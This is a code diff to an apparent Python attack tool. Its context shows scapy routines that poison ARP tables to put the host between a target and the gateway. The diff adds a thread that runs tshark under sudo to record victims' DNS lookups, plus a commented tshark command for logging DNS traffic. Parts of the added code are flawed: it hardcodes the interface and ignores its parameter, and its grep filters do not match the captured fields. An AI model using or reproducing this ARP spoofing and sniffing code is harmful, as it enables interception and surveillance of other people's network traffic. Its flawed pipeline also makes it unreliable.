@@ -20,6 +20,17 @@ class Decoy(Thread):
     def run(self):
         send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = self.targetList, psrc=self.fakeIp), iface=self.interface, verbose=0)
 
+class Sniffer(Thread):
+    def __init__(self, interface, type):
+        Thread.__init__(self)
+        self.interface = interface
+        self.type = type
+        self.interface = interface
+
+    def run(self):
+        if self.type == "dns":
+            os.system("sudo tshark -i wlan0 -f 'dst port 53' -n -T fields -e dns.qry.name > voila; cat voila | grep 'GET\|DNS' | cut -f 3,5,7 | awk 'length($0)<100 {print}' | sed 's/Standard query/ /g' | cut -d ' ' -f 1,2,3,6 | sed 's/\t/ /g'| sort | uniq -c > final" )
+
 def select_interface():
     all_interfaces = netifaces.interfaces()
     all_interfaces_reversed = reversed(all_interfaces)
@@ -36,8 +47,8 @@ def select_interface():
     return select_interface()
 
 def getHwAddr(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     """return the mac address of the interface ifname"""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
     return ':'.join(['%02x' % ord(char) for char in info[18:24]])
 
@@ -158,3 +169,7 @@ def arpSpoofing(gateway_ip, target_ip, my_mac):
     packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=gateway_ip,pdst=target_ip)
     while 1:
         sendp(packet, verbose=0)
+
+
+#dns request
+#sudo tshark -i wlan0 -f "src port 53" -n -T fields -e frame.time -e ip.src -e ip.dst -e dns.qry.name
